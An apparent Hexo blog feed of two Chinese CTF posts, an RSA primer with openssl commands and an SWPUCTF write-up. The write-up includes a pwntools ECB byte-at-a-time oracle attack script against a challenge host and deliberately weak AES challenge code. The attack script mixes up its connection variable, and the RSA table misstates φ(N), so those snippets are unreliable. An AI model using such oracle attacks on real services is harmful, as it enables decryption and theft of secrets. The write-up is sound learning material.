<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-12-10T12:45:25.558Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RSA初探</title>
    <link href="http://example.com/2020/12/08/RSA%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2020/12/08/RSA%E5%88%9D%E6%8E%A2/</id>
    <published>2020-12-08T11:41:10.000Z</published>
    <updated>2020-12-10T12:45:25.558Z</updated>
    
    <content type="html"><![CDATA[<h4 id="RSA初探"><a href="#RSA初探" class="headerlink" title="RSA初探"></a>RSA初探</h4><h5 id="0x01-简介："><a href="#0x01-简介：" class="headerlink" title="0x01.简介："></a>0x01.简介：</h5><p>RSA,非对称加密算法，基于大整数因式分解的难题。对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的 RSA 钥匙才可能被强力方式破解。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被破解的。</p><h5 id="0x02-具体实现："><a href="#0x02-具体实现：" class="headerlink" title="0x02.具体实现："></a>0x02.具体实现：</h5><p>假设Alice从不可靠信道接收Bob一条私人消息。她可以用以下的方式来产生一个<strong>公钥</strong>和一个<strong>私钥</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.任意两个大素数：p,q,且p !&#x3D; q,令n &#x3D; p*q;</span><br><span class="line">2.根据欧拉函数，求得r &#x3D; φ(N) &#x3D; φ(p)*φ(q) &#x3D; (p-1)(q-1);</span><br><span class="line">3.选择任意e，使得(e,r)&#x3D;&#x3D;1,即两数互素，并有e*d &#x3D;&#x3D; 1 mod r , 求出e关于模r的逆元d;</span><br><span class="line">                 1 &lt; E &lt; φ(N)</span><br><span class="line">                 gcd(E,φ(N)) &#x3D; 1</span><br><span class="line">4.(e,n)为加密公钥，(d,n)为解密私钥</span><br></pre></td></tr></table></figure><p>此时已知公钥和私钥：<br>$$<br>加密：<br>c=m^e mod (n)<br>$$</p><p>$$<br>解密:<br>m=c^d mod (n);<br>$$</p><p>其中 <strong>c</strong> 为 cipheretext(密文) , <strong>m</strong> 为plaintext(明文)。</p><p>在线分解大整数N(p*q)  :  <a href="http://factordb.com/">http://factordb.com/</a></p><h5 id="0x03-小结："><a href="#0x03-小结：" class="headerlink" title="0x03.小结："></a>0x03.小结：</h5><table><thead><tr><th align="left">求N</th><th align="left">N＝ p ＊ q ；p，q为大质数</th></tr></thead><tbody><tr><td align="left">求φ(N)</td><td align="left">φ(N)＝ (p－1，q－1)</td></tr><tr><td align="left">求E</td><td align="left">1 &lt; E &lt; φ(N)，gcd(E，φ(N))=1；E，φ(N)最大公约数为1（E和φ(N)互质）</td></tr><tr><td align="left">求D</td><td align="left">1 &lt; D &lt; φ(N)，(E＊D) mod φ(N) ＝ 1</td></tr></tbody></table><h5 id="0x04-常见RSA题型"><a href="#0x04-常见RSA题型" class="headerlink" title="0x04.常见RSA题型"></a>0x04.常见RSA题型</h5><p><img src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20201115203936.png" alt="RSA题目类型"></p><h6 id="（1）已知p-q-e，求解d"><a href="#（1）已知p-q-e，求解d" class="headerlink" title="（1）已知p,q,e，求解d:"></a>（1）已知p,q,e，求解d:</h6><p>题目：</p><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17<br>求解出d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)  <span class="comment">#求φ(N)</span></span><br><span class="line">d=gmpy2.invert(e,phi) <span class="comment">#求逆元d</span></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>此处涉及python两个重要模块, gmpy2和Crypto，Ubuntu下安装教程：</p><p>gmpy2(<a href="https://blog.csdn.net/qq_28573835/article/details/86164877">https://blog.csdn.net/qq_28573835/article/details/86164877</a>)</p><p>Crypto(<a href="https://blog.csdn.net/zhangpeterx/article/details/96428212">https://blog.csdn.net/zhangpeterx/article/details/96428212</a>)</p><p>已知p,q,e，相当于已知模φ(N)=(p-1)<em>(q-1);，由 e</em>d ==1 mod φ(N),即d为 e模φ(N)的逆元，gmpy2.invert()可直接求出逆元d.</p><h6 id="2-已知p、q、e、密文c，求明文m"><a href="#2-已知p、q、e、密文c，求明文m" class="headerlink" title="(2)已知p、q、e、密文c，求明文m"></a>(2)已知p、q、e、密文c，求明文m</h6><p>SWPUCTF 一道RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;c=&#x27;</span>, <span class="string">&#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;e=&#x27;</span>, <span class="string">&#x27;0x872a335&#x27;</span>)</span><br><span class="line"><span class="comment">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line"><span class="comment">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">b = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line">e = <span class="number">0x872a335</span></span><br><span class="line">c = <span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line"></span><br><span class="line">gcd_ = gcd(a, b)        <span class="comment"># 求a,b最大公因子:q*(1+p)</span></span><br><span class="line">p = b // gcd_  </span><br><span class="line">q = b // (p*(p+<span class="number">1</span>))</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)  <span class="comment">#求解密秘钥d</span></span><br><span class="line"><span class="comment">#print(d)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment">#因为pow(a,b,c)含义为a^b mod c,此处即解密公式：m = c^d mod n</span></span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m)) <span class="comment">#长整型转字节，或使用long2str(m)</span></span><br><span class="line"><span class="comment">#参考：https://pythonhosted.org/pycrypto/Crypto.Util.number-module.html</span></span><br></pre></td></tr></table></figure><h6 id="（3）暂定。"><a href="#（3）暂定。" class="headerlink" title="（3）暂定。"></a>（3）暂定。</h6><h5 id="0x05-openssl与RSA："><a href="#0x05-openssl与RSA：" class="headerlink" title="0x05.openssl与RSA："></a>0x05.openssl与RSA：</h5><h6 id="1-生成私钥："><a href="#1-生成私钥：" class="headerlink" title="(1).生成私钥："></a>(1).生成私钥：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl 生成并输入一个RSA私钥 输出参数 私钥名称 对应的n</span><br><span class="line">openssl genrsa -out private.pem <span class="number">1024</span></span><br></pre></td></tr></table></figure><h6 id="2-提取公钥："><a href="#2-提取公钥：" class="headerlink" title="(2)提取公钥："></a>(2)提取公钥：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl 处理RSA密钥的格式转换等问题 提取 输出参数 公钥名称</span><br><span class="line">openssl rsa -<span class="keyword">in</span> private.pem -pubout -out public.pem</span><br></pre></td></tr></table></figure><h6 id="3-使用公钥对明文加密："><a href="#3-使用公钥对明文加密：" class="headerlink" title="(3)使用公钥对明文加密："></a>(3)使用公钥对明文加密：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -encrypt -<span class="keyword">in</span> message.txt -inkey public.pem -pubin -out enc.txt</span><br></pre></td></tr></table></figure><h6 id="4-使用私钥对密文解密："><a href="#4-使用私钥对密文解密：" class="headerlink" title="(4)使用私钥对密文解密："></a>(4)使用私钥对密文解密：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> enc.txt -inkey private.pem -out dec.txt</span><br></pre></td></tr></table></figure><h6 id="5-使用私钥进行签名："><a href="#5-使用私钥进行签名：" class="headerlink" title="(5)使用私钥进行签名："></a>(5)使用私钥进行签名：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -sign -<span class="keyword">in</span> message.txt -inkey private.pem -out enc.<span class="built_in">bin</span></span><br></pre></td></tr></table></figure><h6 id="6-使用公钥进行验证："><a href="#6-使用公钥进行验证：" class="headerlink" title="(6)使用公钥进行验证："></a>(6)使用公钥进行验证：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -verify -<span class="keyword">in</span> enc.<span class="built_in">bin</span> -inkey public.pem -pubin -out dec.txt</span><br></pre></td></tr></table></figure><h6 id="7-查看证书内容："><a href="#7-查看证书内容：" class="headerlink" title="(7)查看证书内容："></a>(7)查看证书内容：</h6><p>（1）将私钥转换为文本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> private.pem -text -out private.txt</span><br></pre></td></tr></table></figure><p>(2)将公钥转换为文本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in public.pem -text -pubin -out public.txt</span><br></pre></td></tr></table></figure><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://whoamianony.top/2020/10/31/ctf/rsa-suan-fa-yuan-li/#toc-heading-15">https://whoamianony.top/2020/10/31/ctf/rsa-suan-fa-yuan-li/#toc-heading-15</a></p><p><a href="https://www.jianshu.com/p/3e8192906ab0">https://www.jianshu.com/p/3e8192906ab0</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;RSA初探&quot;&gt;&lt;a href=&quot;#RSA初探&quot; class=&quot;headerlink&quot; title=&quot;RSA初探&quot;&gt;&lt;/a&gt;RSA初探&lt;/h4&gt;&lt;h5 id=&quot;0x01-简介：&quot;&gt;&lt;a href=&quot;#0x01-简介：&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://example.com/tags/RSA/"/>
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF WriteUp</title>
    <link href="http://example.com/2020/12/05/SWPU/"/>
    <id>http://example.com/2020/12/05/SWPU/</id>
    <published>2020-12-05T14:41:10.000Z</published>
    <updated>2020-12-10T12:47:23.574Z</updated>
    
    <content type="html"><![CDATA[<h5 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h5><p>0X1.</p><p>图片隐写，kali命令行 foremost分离，可以拿到mp4和flag.txt。</p><p>flag.txt内容交了一下，不对。想多了。</p><p>接着就只能看MP4文件，发现了字符串，如下：</p><p>base64直接解码，拿到</p><p>20.txt文件，如图：</p><p>打开文件，一眼看去是base64编码：</p><p>GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q</p><p>base32解码：</p><p>6C76756569616B7875647379716568737A7168796B67677379796C6B767669</p><p>base16解码：</p><p>lvueiakxudsyqehszqhykggsyylkvvi</p><p><code>//The last layer is the single table replacement password</code></p><p>注释提示是单表替换密码，就那么几种，最简单的凯撒，肯定不是，跟flag格式对不上。</p><p>应该是仿射密码（密码学课上刚学，天选之子），之前作业的python脚本还在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>]</span><br><span class="line">c=<span class="string">&#x27;lvueiakxudsyqehszqhykggsyylkvvi&#x27;</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> k1 <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">                k=<span class="built_in">chr</span>((((<span class="built_in">ord</span>(c[ci])-<span class="number">97</span>-k2)*k1)%<span class="number">26</span>)+<span class="number">97</span>)</span><br><span class="line">                <span class="built_in">str</span>+=k</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>)==<span class="built_in">len</span>(c):</span><br><span class="line">            print(<span class="built_in">str</span>,k1,k2)</span><br><span class="line">            <span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑一下，结果如图：</p><h5 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h5><p>0x1.</p><p>下载得到1.xlsx,直接打开，提示损坏，不行。</p><p>老套路，直接尝试binwalk -e 分离文件，如图：</p><p>得到RC4data.txt，直接爆？不可能！应该有秘钥，还得接着找。</p><p>继续binwalk -e swpu.xls,如图，得到RC4key的压缩包，解压提示有密码，尝试爆破，不行。</p><p>继续binwalk -e esayrc4.xlsx,如图：</p><p>最后将0.zip以txt文本形式打开在最后面找到压缩包密码：</p><p>解压缩包得到RC4的秘钥：</p><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></p><p>在线解密（<a href="https://www.sojson.com/encrypt_rc4.html%EF%BC%89">https://www.sojson.com/encrypt_rc4.html）</a></p><h5 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h5><h5 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h5><p>源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">BLOCKSIZE = <span class="number">16</span></span><br><span class="line">flag=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">        pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span>  <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> data + <span class="built_in">chr</span>(pad_len) * pad_len</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">        num = <span class="built_in">ord</span>(data[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> data[:-num]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">data,key</span>):</span></span><br><span class="line">    cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    encrypt = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">data,key</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">        encrypt = cipher.decrypt(data)</span><br><span class="line">        <span class="keyword">return</span> unpad(encrypt)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                key = os.urandom(<span class="number">16</span>)</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        plaintext = raw_input(<span class="string">&quot;Amazing function: &quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                        yusa = plaintext+flag</span><br><span class="line">                        <span class="built_in">print</span> enc(yusa,key).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span> <span class="built_in">str</span>(e)</span><br><span class="line">                exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        task()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据提示和百度引擎，现学ECB Byte at Time（参考文章：<a href="https://www.jianshu.com/p/8aef410a2eae%EF%BC%89">https://www.jianshu.com/p/8aef410a2eae）</a></p><p>因为我们不能提前知道flag长度，只能通过更改明文plaintext的长度进行测试，</p><p>最终可以判断出flag长度是38。</p><p>参考：<a href="https://www.cnblogs.com/crybaby/p/13713566.html">ECB Byte at Time - scriptkid - 博客园 (cnblogs.com)</a></p><p>每次爆破一个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;das.wetolink.com&#x27;</span>, <span class="number">42887</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2b</span>(<span class="params">n</span>):</span></span><br><span class="line">    h = <span class="built_in">hex</span>(n)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">ord</span>(h[<span class="number">0</span>])) + struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">ord</span>(h[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;88&#x27;</span> * (<span class="number">47</span>-i)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Amazing function: &#x27;</span>, payload)</span><br><span class="line">    enc.append(p.recvline()[<span class="number">64</span>:<span class="number">96</span>])</span><br><span class="line">print(enc)</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    f = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;88&#x27;</span> * (<span class="number">47</span>-<span class="built_in">len</span>(flag)//<span class="number">2</span>) + flag + n2b(c)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Amazing function: &#x27;</span>, payload)</span><br><span class="line">        e = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> e[<span class="number">64</span>:<span class="number">96</span>] <span class="keyword">in</span> enc:</span><br><span class="line">            flag += n2b(c)</span><br><span class="line">            print(flag)</span><br><span class="line">            f = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">        exit()</span><br><span class="line">print(unhexlify(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span></span><br><span class="line">BLOCKSIZE = <span class="number">16</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">        pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span>  <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> data + <span class="string">&quot;=&quot;</span> * pad_len</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">        <span class="keyword">return</span> data.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">data,key,iv</span>):</span></span><br><span class="line">    cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    encrypt = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> encrypt</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">data,key,iv</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">        encrypt = cipher.decrypt(data)</span><br><span class="line">        <span class="keyword">return</span> unpad(encrypt)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                key = os.urandom(<span class="number">16</span>)</span><br><span class="line">                iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">                pre = <span class="string">&quot;yusa&quot;</span>*<span class="number">4</span></span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                        choice = raw_input(menu)</span><br><span class="line">                        <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                                name = raw_input(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">                                <span class="keyword">if</span> name == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                                        exit()</span><br><span class="line">                                token = enc(pre+name,key,iv)</span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;Here is your token(in hex): &quot;</span>+iv.encode(<span class="string">&#x27;hex&#x27;</span>)+token.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                                token = raw_input(<span class="string">&quot;Your token(in hex): &quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                                iv = token[:<span class="number">16</span>]</span><br><span class="line">                                name = dec(token[<span class="number">16</span>:],key,iv)</span><br><span class="line">                                <span class="built_in">print</span> iv.encode(<span class="string">&#x27;hex&#x27;</span>)+name.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                                <span class="keyword">if</span> name[:<span class="number">16</span>] == <span class="string">&quot;yusa&quot;</span>*<span class="number">4</span>:</span><br><span class="line">                                        <span class="built_in">print</span> <span class="string">&quot;Hello, &quot;</span>+name[<span class="number">16</span>:]</span><br><span class="line">                                        <span class="keyword">if</span> name[<span class="number">16</span>:] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                                                <span class="built_in">print</span> flag</span><br><span class="line">                                                exit()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                <span 